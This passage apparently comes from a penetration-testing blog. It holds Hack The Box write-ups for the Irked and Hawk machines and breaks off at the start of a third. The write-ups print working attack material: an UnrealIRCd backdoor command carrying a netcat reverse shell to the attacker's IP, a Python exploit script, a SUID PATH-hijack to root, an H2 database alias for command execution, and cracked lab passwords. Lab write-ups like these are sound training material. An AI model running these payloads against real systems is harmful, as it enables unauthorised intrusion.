75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA) | 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA) |_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Site doesn't have a title (text/html). 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 34797/tcp6 status | 100024 1 50110/udp status | 100024 1 54988/udp6 status |_ 100024 1 58697/tcp status 6697/tcp open irc UnrealIRCd 8067/tcp open irc UnrealIRCd 58697/tcp open status 1 (RPC #100024) 65534/tcp open irc UnrealIRCd Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 75.12 seconds The default web page shows this: another hint towards IRC! nmap found the following open ports which relate to the IRC protocol, in particular UnrealIRC: 6697/tcp open irc UnrealIRCd 8067/tcp open irc UnrealIRCd 65534/tcp open irc UnrealIRCd UnrealIRC is one of the most popular IRC server software in the wild. In June 2010 the download mirrors of the software were found to be compromised apparently since November 2009. A backdoored version of the software was uploaded so that everyone who downloaded it and installed that version was affected. nmap contains an nse script which allows us to check if the version of the software is the backdoored one: m4rc0ff@SittingDucks:~$ nmap -d -p6697 --script = irc-unrealircd-backdoor.nse 10 .10.10.117 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-05 06:26 BST --------------- Timing report --------------- hostgroups: min 1, max 100000 rtt-timeouts: init 1000, min 100, max 10000 max-scan-delay: TCP 1000, UDP 1000, SCTP 1000 parallelism: min 0, max 0 max-retries: 10, host-timeout: 0 min-rate: 0, max-rate: 0 --------------------------------------------- NSE: Using Lua 5.3. NSE: Arguments from CLI: NSE: Loaded 1 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 1) scan. Initiating NSE at 06:26 Completed NSE at 06:26, 0.00s elapsed Initiating Ping Scan at 06:26 Scanning 10.10.10.117 [2 ports] Completed Ping Scan at 06:26, 0.12s elapsed (1 total hosts) Overall sending rates: 16.51 packets / s. mass_rdns: Using DNS server 192.168.16.2 Initiating Parallel DNS resolution of 1 host. at 06:26 mass_rdns: 0.07s 0/1 [#: 1, OK: 0, NX: 0, DR: 0, SF: 0, TR: 1] Completed Parallel DNS resolution of 1 host. at 06:26, 0.07s elapsed DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating Connect Scan at 06:26 Scanning 10.10.10.117 [1 port] Discovered open port 6697/tcp on 10.10.10.117 Completed Connect Scan at 06:26, 0.09s elapsed (1 total ports) Overall sending rates: 10.86 packets / s. NSE: Script scanning 10.10.10.117. NSE: Starting runlevel 1 (of 1) scan. Initiating NSE at 06:26 NSE: Starting irc-unrealircd-backdoor against 10.10.10.117:6697. NSE: [irc-unrealircd-backdoor 10.10.10.117:6697] Sending command: TIME NSE: [irc-unrealircd-backdoor 10.10.10.117:6697] Sending command: AB;SOMETHINGUNIQUE;sleep 8;ping -n 9 127.0.0.1; NSE: [irc-unrealircd-backdoor 10.10.10.117:6697] Received a response to our command in 8 seconds NSE: [irc-unrealircd-backdoor 10.10.10.117:6697] Looks like the Trojanned unrealircd is running! NSE: Finished irc-unrealircd-backdoor against 10.10.10.117:6697. Completed NSE at 06:27, 18.42s elapsed Nmap scan report for 10.10.10.117 Host is up, received syn-ack (0.12s latency). Scanned at 2020-06-05 06:26:52 BST for 19s PORT STATE SERVICE REASON 6697/tcp open ircs-u syn-ack |_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277 Final times for host: srtt: 117384 rttvar: 98033 to: 509516 NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 1) scan. Initiating NSE at 06:27 Completed NSE at 06:27, 0.00s elapsed Read from /usr/bin/../share/nmap: nmap-payloads nmap-services. Nmap done: 1 IP address (1 host up) scanned in 18.84 seconds The above scan on port 6697 shows that we are indeed dealing with the \"trojaned\" version of the UnrealIRC. This article is a good one to understand a bit more about the logic behind the backdoor. To sum up, the malicious bit of code is hiding itself as a debug kind of functionality. This is the interesting bit: #ifdef DEBUGMODE3 if ( ! memcmp ( readbuf , DEBUGMODE3_INFO , 2 )) DEBUG3_LOG ( readbuf ); #endif where DEBUG3_LOG will end up being a call to system() and DEBUGMODE3_INFO is just the string AB . This means that any commands sent to the IRC server that start with AB will be handed off directly to system() . Using system() , we can execute any command that can run on terminal if operating system allows. For example, we can call system(\"ls\") to list contents of a directory, but obviosly we can do more dangerous things like getting a reverse shell. There is a metasploit module for UnrealIRC but for the sake of learning I am not going to use it. I can still use metasploit module to understand how the exploit works though. This is the function that triggers the exploit for the metasploit UnrealIRC module available at /usr/share/metasploit-framework/modules/exploits/unix/irc/unreal_ircd_3281_backdoor.rb in my kali box: def exploit connect print_status ( \"Connected to #{ rhost } : #{ rport } ...\" ) banner = sock . get_once ( - 1 , 30 ) banner . to_s . split ( \" \\n \" ) . each do | line | print_line ( \" #{ line } \" ) end print_status ( \"Sending backdoor command...\" ) sock . put ( \"AB;\" + payload . encoded + \" \\n \" ) # Wait for the request to be handled 1 . upto ( 120 ) do break if session_created? select ( nil , nil , nil , 0 . 25 ) handler () end disconnect end According to the explanation of the fake debug function, the ruby code above connects to the IRC server (rhost) and then sends a payload precedeed by the AB string. So I can easily perform the same steps manually: 1) I connect to the IRC server on port 6697 using netcat: m4rc0ff@SittingDucks:~$ sudo nc 10 .10.10.117 6697 :irked.htb NOTICE AUTH :*** Looking up your hostname... :irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead 2) I open a netcat listner on my box on a port I choose, 443 in this case: m4rc0ff@SittingDucks:~$ sudo nc -lnvp 443 listening on [any] 443 .. 3) I submit a reverse shell oneliner (got it from pentestmonkey ) prepended by the AB string to the netcat connection I had created on step 1. m4rc0ff@SittingDucks:~$ sudo nc 10 .10.10.117 6697 :irked.htb NOTICE AUTH :*** Looking up your hostname... :irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.18 443 >/tmp/f 4) I get my reverse shell back: m4rc0ff@SittingDucks:~$ sudo nc -lnvp 443 listening on [any] 443 ... connect to [10.10.14.18] from (UNKNOWN) [10.10.10.117] 57600 bash: cannot set terminal process group (641): Inappropriate ioctl for device bash: no job control in this shell ircd@irked:~/Unreal3.2$ whoami whoami ircd ircd@irked:~/Unreal3.2$ We are in! I also wrote a little python script that does the same work. The script does not do any checks and it's very basic, but it does work! #!/usr/bin/python import socket IRC_IP = '10.10.10.117' IRC_PORT = 6697 My_IP = '10.10.14.18' My_PORT = 443 payload = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc My_IP My_PORT >/tmp/f' s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( IRC_IP , int ( IRC_PORT ))) s . recv ( 1024 ) s . send ( \"AB; + payload + \\n \" ) s . close () Once I make the above script executable, I setup a netcat listener on port 443 and run the script. And voila' our shell again: m4rc0ff@SittingDucks:~$ sudo nc -lnvp 443 [sudo] password for m4rc0ff: listening on [any] 443 ... connect to [10.10.14.18] from (UNKNOWN) [10.10.10.117] 57601 bash: cannot set terminal process group (641): Inappropriate ioctl for device bash: no job control in this shell ircd@irked:~/Unreal3.2$ whoami whoami ircd ircd@irked:~/Unreal3.2$ I looked up for the user.txt flag: ircd@irked:~$ locate user.txt locate user.txt /home/djmardov/Documents/user.txt /usr/share/doc/fontconfig/fontconfig-user.txt.gz ircd@irked:~$ cat /home/djmardov/Documents/user.txt cat /home/djmardov/Documents/user.txt cat: /home/djmardov/Documents/user.txt: Permission denied This means we have to privesc to djmardov to get the flag. Let's look for hidden files in the home directory: ircd@irked:/home$ find /home/ -type f -iname \".*\" -ls 2 > /dev/null 1062367 4 -rw------- 1 ircd ircd 124 Apr 24 2004 /home/ircd/Unreal3.2/.cvsignore 1062303 4 -rw------- 1 ircd ircd 932 Apr 13 2009 /home/ircd/Unreal3.2/.CHANGES.NEW 1062261 8 -rw------- 1 ircd ircd 5623 Apr 13 2009 /home/ircd/Unreal3.2/.RELEASE.NOTES 1062360 4 -rw------- 1 ircd ircd 2791 Apr 24 2004 /home/ircd/Unreal3.2/.bugreport.gdb 1062356 4 -rw------- 1 ircd ircd 1645 Apr 24 2004 /home/ircd/Unreal3.2/.CONFIG.RANT 1179206 4 -rw------- 1 ircd ircd 2 Apr 24 2004 /home/ircd/Unreal3.2/keys/.KEYS 1062306 4 -rw------- 1 ircd ircd 519 Dec 10 2000 /home/ircd/Unreal3.2/.UPDATE 1062308 4 -rw------- 1 ircd ircd 1060 Apr 24 2004 /home/ircd/Unreal3.2/.SICI 1062357 4 -rw------- 1 ircd ircd 794 Aug 20 2000 /home/ircd/Unreal3.2/.indent.pro 1061896 4 -rw------- 1 ircd ircd 345 Jun 5 03:12 /home/ircd/.bash_history 1061889 4 -rw-r--r-- 1 ircd ircd 66 May 14 2018 /home/ircd/.selected_editor 1061890 0 -rw-r--r-- 1 ircd ircd 0 May 14 2018 /home/ircd/.bashrc 1061885 4 -rw-r--r-- 1 djmardov djmardov 675 May 11 2018 /home/djmardov/.profile 1177807 4 -rw-r--r-- 1 djmardov djmardov 52 May 16 2018 /home/djmardov/Documents/.backup 1061897 8 -rw------- 1 djmardov djmardov 4706 Nov 3 2018 /home/djmardov/.ICEauthority 1061886 4 -rw-r--r-- 1 djmardov djmardov 220 May 11 2018 /home/djmardov/.bash_logout 1061887 4 -rw-r--r-- 1 djmardov djmardov 3515 May 11 2018 /home/djmardov/.bashrc There is a file named backup in the djmardov/Documents directory: ircd@irked:/home$ file djmardov/Documents/.backup djmardov/Documents/.backup: ASCII text ircd@irked:/home$ cat djmardov/Documents/.backup Super elite steg backup pw UPupDOWNdownLRlrBAbaSSss It's a text file and contains something that looks like a password. ircd@irked:/home$ su djmardov Password: su: Authentication failure I tried to login as djmardov but didn't work. One thing I noticed is the workd \"steg\" in the backup file content. I searched for files with most common extension for images in the box but did not find anything. The only image I could think of is the one on the default website. So I download the image to my kali box and then I ran steghide to extract the content: m4rc0ff@SittingDucks:~/Documents/htbBoxes/irked$ steghide --extract -sf irked.jpg Enter passphrase: wrote extracted data to \"pass.txt\". So apparently there was something in there and it was extracted on a file: m4rc0ff@SittingDucks:~/Documents/htbBoxes/irked$ cat pass.txt Kab6h+m+bbp2J:HG m4rc0ff@SittingDucks:~/Documents/htbBoxes/irked$ ssh djmardov@10.10.10.117 djmardov@10.10.10.117's password: The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue May 15 08:56:32 2018 from 10.33.3.3 djmardov@irked:~$ whoami djmardov djmardov@irked:~$ The file showed another password and when I tried to ssh as djmardov I was successful and able to grab the flag: djmardov@irked:~/Documents$ cat user.txt 4a****************************8e At this stage I decided to run LinEnum to gather information that could help us to root the box. I ran a python SimpleHTTPServer on my kali box in the same directory where I have LinEnum.sh and then I downloaded to the victim machine using wget. Then I ran the script and started going through the output. The output is large so I paste here just what I found interesting and relevant: [-] SUID files: -rwsr-xr-- 1 root messagebus 362672 Nov 21 2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 9468 Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 13816 Sep 8 2016 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-x 1 root root 562536 Nov 19 2017 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 13564 Oct 14 2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper -rwsr-xr-x 1 root root 1085300 Feb 10 2018 /usr/sbin/exim4 -rwsr-xr-- 1 root dip 338948 Apr 14 2015 /usr/sbin/pppd -rwsr-xr-x 1 root root 43576 May 17 2017 /usr/bin/chsh -rwsr-sr-x 1 root mail 96192 Nov 18 2017 /usr/bin/procmail -rwsr-xr-x 1 root root 78072 May 17 2017 /usr/bin/gpasswd -rwsr-xr-x 1 root root 38740 May 17 2017 /usr/bin/newgrp -rwsr-sr-x 1 daemon daemon 50644 Sep 30 2014 /usr/bin/at -rwsr-xr-x 1 root root 18072 Sep 8 2016 /usr/bin/pkexec -rwsr-sr-x 1 root root 9468 Apr 1 2014 /usr/bin/X -rwsr-xr-x 1 root root 53112 May 17 2017 /usr/bin/passwd -rwsr-xr-x 1 root root 52344 May 17 2017 /usr/bin/chfn -rwsr-xr-x 1 root root 7328 May 16 2018 /usr/bin/viewuser -rwsr-xr-x 1 root root 96760 Aug 13 2014 /sbin/mount.nfs -rwsr-xr-x 1 root root 38868 May 17 2017 /bin/su -rwsr-xr-x 1 root root 34684 Mar 29 2015 /bin/mount -rwsr-xr-x 1 root root 34208 Jan 21 2016 /bin/fusermount -rwsr-xr-x 1 root root 161584 Jan 28 2017 /bin/ntfs-3g -rwsr-xr-x 1 root root 26344 Mar 29 2015 /bin/umount from the above files, /usr/bin/viewuser is not a common I usually see. To be honest is also difficult to identify these kind of things, it takes lot of experience. I initially ignored all the SUID files as nothing jumped out at first glance, and only later I got back and inspect carefully when I could not find anything else. djmardov@irked:~/Documents$ ls -l /usr/bin/viewuser -rwsr-xr-x 1 root root 7328 May 16 2018 /usr/bin/viewuser djmardov@irked:~/Documents$ viewuser This application is being devleoped to set and test user permissions It is still being actively developed (unknown) :0 2020-06-04 09:20 (:0) djmardov pts/1 2020-06-05 07:12 (10.10.14.18) sh: 1: /tmp/listusers: not found As we have permissions, I run the binary and get the above output. We can see there is a reference to another file that is not found, /tmp/listusers . Let's create that file containing the whoami binary: djmardov@irked:~/Documents$ echo whoami > /tmp/listusers djmardov@irked:~/Documents$ viewuser This application is being devleoped to set and test user permissions It is still being actively developed (unknown) :0 2020-06-04 09:20 (:0) djmardov pts/1 2020-06-05 07:12 (10.10.14.18) sh: 1: /tmp/listusers: Permission denied Now it is not complaining about the file existence anymore but about permissions. Having a look at the file, root has read and write but not execute permissions: djmardov@irked:~/Documents$ ls -l /tmp/listusers -rw-r--r-- 1 djmardov djmardov 13 Jun 5 08:10 /tmp/listusers So I'll make the file executable: djmardov@irked:~/Documents$ chmod +x /tmp/listusers djmardov@irked:~/Documents$ ls -l /tmp/listusers -rwxr-xr-x 1 djmardov djmardov 13 Jun 5 08:10 /tmp/listusers Then I run it again: djmardov@irked:~$ echo whoami > /tmp/listusers djmardov@irked:~$ viewuser This application is being devleoped to set and test user permissions It is still being actively developed (unknown) :0 2020-06-04 09:20 (:0) djmardov pts/1 2020-06-05 07:12 (10.10.14.18) root Since the viewuser script is owned by root we can see whoami command returns root. to get the root flag we can do the following: djmardov@irked:~$ echo \"cat /root/root.txt\" > /tmp/listusers djmardov@irked:~$ viewuser This application is being devleoped to set and test user permissions It is still being actively developed (unknown) :0 2020-06-04 09:20 (:0) djmardov pts/1 2020-06-05 07:12 (10.10.14.18) 8d****************************f3 Or to get a full shell we can do this: djmardov@irked:~$ echo bash > /tmp/listusers djmardov@irked:~$ view djmardov@irked:~$ viewuser This application is being devleoped to set and test user permissions It is still being actively developed (unknown) :0 2020-06-04 09:20 (:0) djmardov pts/1 2020-06-05 07:12 (10.10.14.18) root@irked:~# whoami root","tags":"blogging","loc":"https://sittingducks.io/Irked.html","title":"Irked"},{"url":"https://sittingducks.io/Hawk.html","text":"Hawk is an easy box. I initially spent some time into trying to find a weak point in the webserver, only to find out later that the FTP server was the key. Once in, is quite easy to get a shell. The part I enjoy most was the privesc to root since it involved an H2 db which was new to me. Recon m4rc0ff@SittingDucks:~$ nmap -sC -sV 10 .10.10.102 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 23:55 BST Nmap scan report for 10.10.10.102 Host is up (0.085s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxr-xr-x 2 ftp ftp 4096 Jun 16 2018 messages | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.14.15 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA) | 256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA) |_ 256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: Drupal 7 (http://drupal.org) | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Welcome to 192.168.56.103 | 192.168.56.103 8082/tcp open http H2 database http console |_http-title: H2 Console Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 27.40 seconds Nmap suggests there is a standard apache http server running on port 80. Navigating to http://10.10.10.102 produces this result: I scan for directories using gobuster : m4rc0ff@SittingDucks:~/Documents/htbBoxes/hawk$ gobuster dir -u http://10.10.10.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt -t 20 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.102 [+] Threads: 20 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: html,php,txt [+] Timeout: 10s =============================================================== 2020/06/01 15:00:24 Starting gobuster =============================================================== /search (Status: 403) /misc (Status: 301) /0 (Status: 200) /index.php (Status: 200) /themes (Status: 301) /user (Status: 200) /modules (Status: 301) /admin (Status: 403) /scripts (Status: 301) /node (Status: 200) /Search (Status: 403) /sites (Status: 301) /includes (Status: 301) /install.php (Status: 200) /profiles (Status: 301) /update.php (Status: 403) /README (Status: 200) /README.txt (Status: 200) /robots (Status: 200) /robots.txt (Status: 200) /cron.php (Status: 403) /INSTALL (Status: 200) /INSTALL.txt (Status: 200) /LICENSE (Status: 200) /LICENSE.txt (Status: 200) /User (Status: 200) /Admin (Status: 403) /Template (Status: 403) /CHANGELOG (Status: 200) /CHANGELOG.txt (Status: 200) /xmlrpc.php (Status: 200) /COPYRIGHT (Status: 200) /COPYRIGHT.txt (Status: 200) <SNIP> I started looking at the directories above one by one trying to find a weak point but did not find anything. I particularly focused on xmprpc.php as I know this API can let us make calls but the methods I found did not seem to be vulnerable, that is I was unable to inject anything that would give me an RCE. I then found a drupal enumeration tool online, drupwn and I gave it a try: m4rc0ff@SittingDucks:~/Tools/drupwn$ python3 drupwn --mode enum --target http://10.10.10.102 ____ / __ \\_______ ______ _ ______ / / / / ___/ / / / __ \\ | /| / / __ \\ / /_/ / / / /_/ / /_/ / |/ |/ / / / / /_____/_/ \\__,_/ .___/|__/|__/_/ /_/ /_/ [-] Version not specified, trying to identify it [+] Version detected: 7.58 ============ Modules ============ ============ Custom Modules ============ ============ Users ============ [+] ***** (id=2) [+] ***** (id=1) ============ Default files ============ [+] /README.txt (200) [+] /LICENSE.txt (200) [+] /robots.txt (200) [+] /web.config (200) [+] /xmlrpc.php (200) [+] /install.php (200) [+] /update.php (403) ============ Nodes ============ ============ Themes ============ ============ Custom Themes ============ Probably the only useful info is the version of Drupal, that is 7.58. Looking at the other http open port, 8082, we see this: this means access to the H2 database http interface is only allowed from localhost, no remote access allowed. The H2 database is an opensource java SQL database. After being stuck for a while I decided to have a look at the FTP server. nmap had shown an successful login so I assume anynomous authentication is allowed: m4rc0ff@SittingDucks:~$ ftp 10 .10.10.102 Connected to 10.10.10.102. 220 (vsFTPd 3.0.3) Name (10.10.10.102:m4rc0ff): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp> ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 3 ftp ftp 4096 Jun 16 2018 . drwxr-xr-x 3 ftp ftp 4096 Jun 16 2018 .. drwxr-xr-x 2 ftp ftp 4096 Jun 16 2018 messages 226 Directory send OK. ftp> cd messages 250 Directory successfully changed. ftp> ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 Jun 16 2018 . drwxr-xr-x 3 ftp ftp 4096 Jun 16 2018 .. -rw-r--r-- 1 ftp ftp 240 Jun 16 2018 .drupal.txt.enc 226 Directory send OK. ftp> get .drupal.txt.enc local: .drupal.txt.enc remote: .drupal.txt.enc 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for .drupal.txt.enc (240 bytes). 226 Transfer complete. 240 bytes received in 0.00 secs (3.5213 MB/s) ftp> exit 221 Goodbye. The above block shows that I was able to login anonymously to the FTP server. Once there I found a hidden file called .drupal.txt.enc inide the messages directory, which i download to my box. m4rc0ff@SittingDucks:~$ mv .drupal.txt.enc ~/Documents/htbBoxes/hawk/drupal.txt.enc m4rc0ff@SittingDucks:~$ cd Documents/htbBoxes/hawk/ m4rc0ff@SittingDucks:~/Documents/htbBoxes/hawk$ file drupal.txt.enc drupal.txt.enc: openssl enc'd data with salted password, base64 encoded The file is an encrypted text file and may contain useful information so we need to crack it. To do this we can use a tool called openssl-bruteforce . The tool will do a dictionary attack with a wordlist and will try different available ciphers: m4rc0ff@SittingDucks:~/Tools/openssl-bruteforce$ python brute.py /usr/share/wordlists/rockyou.txt ciphers.txt ~/Documents/htbBoxes/hawk/drupal.txt.enc 2 > /dev/null Running pid: 25389 Cipher: AES-128-CBC Running pid: 25882 Cipher: AES-128-CFB Running pid: 25892 Cipher: AES-128-CFB1 Running pid: 25902 Cipher: AES-128-CFB8 Running pid: 25912 Cipher: AES-128-CTR Running pid: 25922 Cipher: AES-128-ECB Running pid: 26529 Cipher: AES-128-OFB Running pid: 26539 Cipher: AES-192-CBC Running pid: 27983 Cipher: AES-192-CFB Running pid: 27993 Cipher: AES-192-CFB1 Running pid: 28003 Cipher: AES-192-CFB8 Running pid: 28013 Cipher: AES-192-CTR Running pid: 28023 Cipher: AES-192-ECB Running pid: 28501 Cipher: AES-192-OFB Running pid: 28511 Cipher: AES-256-CBC -------------------------------------------------- Password found with algorithm AES-256-CBC: friends Data: Daniel, Following the password for the portal: PencilKeyboardScanner123 Please let us know when the portal is ready. Kind Regards, IT department -------------------------------------------------- <SNIP> After few seconds the tool was able to crack the file and we can see there is an email with a password, PencilKeyboardScanner123 . I tried logging in with username daniel and the password just found but was not successful. However, I was successful with username admin and the same password: As I had already dealt with Drupal in the past I knew about the php filter module. This module allows for PHP code to be evaluated and it is disabled by default. With this enabled I can easily create some content containing a PHP reverse shell which will be executed once is called. So I navigate to the module page and I enable the filter: Then I create an article containing my PHP reverse shell code: Once the article is saved all I have to do is to navigate to it to get my shell. Of course I need to setup a listener first, in this case on port 443: m4rc0ff@SittingDucks:~$ sudo nc -lnvp 443 listening on [any] 443 ... connect to [10.10.14.21] from (UNKNOWN) [10.10.10.102] 57652 /bin/sh: 0: can't access tty; job control turned off $ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' www-data@hawk:/var/www/html$ &#94;Z [1]+ Stopped sudo nc -lnvp 443 m4rc0ff@SittingDucks:~$ stty -a speed 38400 baud; rows 59; columns 209; line = 0; intr = &#94;C; quit = &#94;\\; erase = &#94;?; kill = &#94;U; eof = &#94;D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = &#94;Q; stop = &#94;S; susp = &#94;Z; rprnt = &#94;R; werase = &#94;W; lnext = &#94;V; discard = &#94;O; min = 1; time = 0; -parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts -ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8 opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0 isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc m4rc0ff@SittingDucks:~$ stty raw -echo m4rc0ff@SittingDucks:~$ sudo nc -lnvp 443 www-data@hawk:/var/www/html$ stty rows 59 columns 209 www-data@hawk:/var/www/html$ whoami www-data We have a shell and I immediately upgraded to an interactive shell using the process described here . The whoami command shows we are the www-data user. Surprisingly we had read permissions on the user flag so that I was able to grab it: www-data@hawk:/var/www/html$ cat /home/daniel/user.txt d5****************************a8 Before doing anything I start exploring all the webserver directories and subdirectories. Inside the file /var/www/html/sites/default/settings.php I find this piece of information: <?php < SNIP > $databases = array ( 'default' => array ( 'default' => array ( 'database' => 'drupal' , 'username' => 'drupal' , 'password' => 'drupal4hawk' , 'host' => 'localhost' , 'port' => '' , 'driver' => 'mysql' , 'prefix' => '' , ), ), ); < SNIP > ?> These are the credentials the webserver uses to connect to the mysql database to store or fetch data. Let's try if the password just found works with the daniel user account: www-data@hawk:/var/www/html$ su - daniel Password: Python 3.6.5 (default, Apr 1 2018, 05:46:30) [GCC 7.3.0] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> The password worked but we are on a python shell rather than the usual bash shell. Getting a bash shell is very easy: >>> import os ; os . system ( \"/bin/bash\" ) daniel@hawk:~$ Good that we have a shell as daniel but since already got the user flag with the www-data user this is now very useful. What we can do though is to setup an SSH tunnel so that we will be able to access the H2 db web page from our box: m4rc0ff@SittingDucks:~$ ssh daniel@10.10.10.102 -L 1234 :localhost:8082 daniel@10.10.10.102's password: Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue Jun 2 06:40:08 UTC 2020 System load: 0.0 Processes: 131 Usage of /: 54.1% of 9.78GB Users logged in: 0 Memory usage: 49% IP address for ens33: 10.10.10.102 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 55 packages can be updated. 3 updates are security updates. Last login: Sun Jul 1 13:46:16 2018 from dead:beef:2::1004 Python 3.6.5 (default, Apr 1 2018, 05:46:30) [GCC 7.3.0] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. > >> now we are able to browse to the H2 db web page navigating to http://127.0.0.1:1234 : I tried the same password to login but didn't work. Then I found out that if you specify a different database name instead of test and provide your own credentials, the system will create a new database with the new name and new credentials: Once I click on connect the db gets created and I am connected to it: Now we are in and if we find the right query we may be able to get a shell. Searching for \"h2 database reverse shell\" on Google yields this page as the first result. The article shows that we can easily get a RCE by creating an alias with the following query: CREATE ALIAS SHELLEXEC AS $$ String shellexec ( String cmd ) throws java . io . IOException { java . util . Scanner s = new java . util . Scanner ( Runtime . getRuntime (). exec ( cmd ). getInputStream ()). useDelimiter ( \"\\\\A\" ); return s . hasNext () ? s . next () : \"\" ; }$$ ; So I paste this code into the SQL statement box and click on run: then I verify I got RCE: As expected we are root and we can then read the root flag: This was quite easy. However, it wasn't that easy to get a root shell and I am not sure why. I tried many reverse shell one liners, probably all the ones available at pentestmonkey and some others but I did not get a shell. In the end I ended up pushing my SSH public key into the authorized_keys file of hawk and I was able to SSH as root: m4rc0ff@SittingDucks:~/.ssh$ ssh -i id_rsa root@10.10.10.102 Enter passphrase for key 'id_rsa': Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue Jun 2 07:09:55 UTC 2020 System load: 0.0 Processes: 136 Usage of /: 54.1% of 9.78GB Users logged in: 1 Memory usage: 56% IP address for ens33: 10.10.10.102 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 55 packages can be updated. 3 updates are security updates. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sat Jul 14 21:09:40 2018 root@hawk:~#","tags":"blogging","loc":"https://sittingducks.io/Hawk.html","title":"Hawk"},{"url":"https://sittingducks.io/devOops.html","text":"Recon m4rc0ff@SittingDucks:~$ nmap -sC -sV 10 .10.10.91 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-29 14:08 BST Nmap scan report for 10.10.10.91 Host is up (0.086s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | 